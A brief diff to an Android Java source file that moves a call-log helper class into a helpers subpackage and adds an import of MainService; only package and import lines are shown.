@@ -1,9 +1,11 @@
-package com.android.background.services;
+package com.android.background.services.helpers;
 
 import android.annotation.SuppressLint;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.CallLog;
+
+import com.android.background.services.MainService;
 
 import org.json.JSONArray;
 import org.json.JSONException;
